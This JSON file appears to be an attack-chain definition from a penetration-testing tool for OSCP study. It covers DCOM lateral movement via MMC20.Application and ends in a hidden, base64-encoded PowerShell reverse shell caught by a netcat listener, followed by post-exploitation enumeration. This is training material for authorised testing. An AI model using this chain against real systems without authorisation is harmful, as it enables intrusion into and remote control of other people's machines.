{
  "id": "windows-lateral-dcom-exploitation",
  "name": "DCOM Lateral Movement Attack Chain (MMC20)",
  "description": "Complete DCOM exploitation: verify RPC access, instantiate remote COM object, execute reverse shell via MMC20.Application",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team",
    "created": "2025-11-08",
    "updated": "2025-11-08",
    "tags": [
      "OSCP",
      "WINDOWS",
      "ACTIVE_DIRECTORY",
      "LATERAL_MOVEMENT",
      "DCOM",
      "MMC20",
      "RPC",
      "POWERSHELL",
      "OSCP:HIGH"
    ],
    "category": "lateral_movement",
    "platform": "windows",
    "references": [
      "https://attack.mitre.org/techniques/T1021/003/",
      "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/"
    ]
  },
  "difficulty": "advanced",
  "time_estimate": "20 minutes",
  "oscp_relevant": true,
  "prerequisites": [
    "Compromised Windows host with PowerShell access",
    "Valid domain credentials with local admin rights on target",
    "RPC port 135 accessible on target",
    "WMI/WinRM blocked or unavailable (DCOM is fallback technique)",
    "Base64-encoded PowerShell payload prepared"
  ],
  "notes": "DCOM (Distributed Component Object Model) lateral movement via MMC20.Application is alternative when WMI/WinRM blocked. Discovered by Matt Nelson (@enigma0x3) in 2017. HOW IT WORKS: Instantiate remote MMC COM object via DCOM, call ExecuteShellCommand method to run arbitrary commands. ADVANTAGES: Uses same RPC port as WMI (135) but different protocol, bypasses WMI-specific restrictions, fileless execution (no binary drop). DISADVANTAGES: Requires PowerShell on compromised host (can't execute from Kali), complex syntax, processes run in Session 0 (invisible). OSCP RELEVANCE: High - critical fallback when primary techniques blocked.",
  "steps": [
    {
      "id": "verify-rpc-port",
      "name": "Verify RPC Port 135 Accessible",
      "objective": "Confirm RPC endpoint mapper port 135 is open for DCOM communication",
      "description": "Use Test-NetConnection from PowerShell to verify port 135 accessibility. DCOM requires RPC port 135 + ephemeral high ports (49152-65535).",
      "command_ref": "dcom-verify-rpc-port",
      "dependencies": [],
      "evidence": [
        "TcpTestSucceeded : True",
        "RemotePort : 135",
        "Connection successful"
      ],
      "success_criteria": [
        "Port 135 accessible",
        "Connection establishes",
        "No firewall blocking"
      ],
      "failure_conditions": [
        "TcpTestSucceeded : False",
        "Connection timeout",
        "Port filtered"
      ],
      "next_steps": [
        "test-dcom-calc"
      ]
    },
    {
      "id": "test-dcom-calc",
      "name": "Test DCOM with Calculator PoC",
      "objective": "Verify DCOM exploitation works with harmless calculator test before deploying payload",
      "description": "Execute calculator on target using MMC20.Application.ExecuteShellCommand. This confirms DCOM works without risking payload detection.",
      "command_ref": "dcom-mmc20-calc-poc",
      "dependencies": [
        "verify-rpc-port"
      ],
      "evidence": [
        "PowerShell command executes without error",
        "Calculator process appears on target (verify with tasklist)",
        "No Exception calling CreateInstance"
      ],
      "success_criteria": [
        "No PowerShell errors",
        "calc.exe or win32calc.exe running on target",
        "DCOM communication successful"
      ],
      "failure_conditions": [
        "Exception calling CreateInstance",
        "RPC server unavailable",
        "Access denied"
      ],
      "next_steps": [
        "generate-payload"
      ]
    },
    {
      "id": "generate-payload",
      "name": "Generate Base64 PowerShell Payload",
      "objective": "Create encoded reverse shell payload for DCOM execution",
      "description": "Use Python script to generate base64-encoded PowerShell reverse shell with attacker LHOST/LPORT. Encoding necessary for ExecuteShellCommand argument passing.",
      "command_ref": "revshell-ps-generator",
      "dependencies": [
        "test-dcom-calc"
      ],
      "evidence": [
        "Base64 payload string generated",
        "Payload includes correct LHOST",
        "Payload includes correct LPORT"
      ],
      "success_criteria": [
        "Base64 string created",
        "LHOST/LPORT correct",
        "Payload format valid"
      ],
      "failure_conditions": [
        "Script error",
        "Invalid encoding",
        "Wrong LHOST/LPORT"
      ],
      "next_steps": [
        "setup-listener"
      ]
    },
    {
      "id": "setup-listener",
      "name": "Start Netcat Listener on Kali",
      "objective": "Prepare listener to catch incoming reverse shell connection",
      "description": "Start nc -lvnp on specified port (commonly 443 or 4444) before executing DCOM payload.",
      "command_ref": "nc-listener-tcp",
      "dependencies": [
        "generate-payload"
      ],
      "evidence": [
        "Netcat listening on specified port",
        "listening on [any] <PORT>",
        "Ready for connection"
      ],
      "success_criteria": [
        "Listener running",
        "Correct port",
        "No port conflicts"
      ],
      "failure_conditions": [
        "Port already in use",
        "Permission denied",
        "Listener crashes"
      ],
      "next_steps": [
        "execute-dcom-payload"
      ]
    },
    {
      "id": "execute-dcom-payload",
      "name": "Execute DCOM Reverse Shell",
      "objective": "Deploy PowerShell reverse shell via DCOM MMC20.Application",
      "description": "Instantiate remote MMC20.Application object, call ExecuteShellCommand with base64 payload. Syntax: $dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'powershell -nop -w hidden -e <BASE64>','7')",
      "command_ref": "dcom-mmc20-revshell",
      "dependencies": [
        "setup-listener"
      ],
      "evidence": [
        "PowerShell command completes",
        "No Exception errors",
        "Listener receives connection"
      ],
      "success_criteria": [
        "CreateInstance succeeds",
        "ExecuteShellCommand returns",
        "Netcat catches shell"
      ],
      "failure_conditions": [
        "Exception calling CreateInstance",
        "No callback received",
        "Payload blocked"
      ],
      "next_steps": [
        "verify-shell-access"
      ]
    },
    {
      "id": "verify-shell-access",
      "name": "Verify Remote Shell Access",
      "objective": "Confirm reverse shell connection and identify target system",
      "description": "Run whoami and hostname in caught shell to verify access and confirm correct target. Shell runs as authenticated user in Session 0.",
      "command_ref": "verify-root-access-ad",
      "dependencies": [
        "execute-dcom-payload"
      ],
      "evidence": [
        "Interactive PowerShell prompt",
        "whoami: DOMAIN\\<user>",
        "hostname: <target>"
      ],
      "success_criteria": [
        "Shell responsive",
        "Correct target confirmed",
        "User context identified"
      ],
      "failure_conditions": [
        "Shell disconnects",
        "No command output",
        "Wrong target"
      ],
      "next_steps": [
        "enumerate-target"
      ]
    },
    {
      "id": "enumerate-target",
      "name": "Post-Exploitation Enumeration",
      "objective": "Gather system information and identify privilege escalation paths",
      "description": "Run enumeration commands: whoami /priv, whoami /groups, systeminfo, Get-Process, Get-Service, check for misconfigurations.",
      "command_ref": "check-sudo-privs",
      "dependencies": [
        "verify-shell-access"
      ],
      "evidence": [
        "System information collected",
        "Privileges enumerated",
        "Running processes identified"
      ],
      "success_criteria": [
        "Enumeration completes",
        "Useful data obtained",
        "Next steps identified"
      ],
      "failure_conditions": [
        "Commands fail",
        "Shell unstable",
        "AV blocks enumeration"
      ]
    }
  ]
}
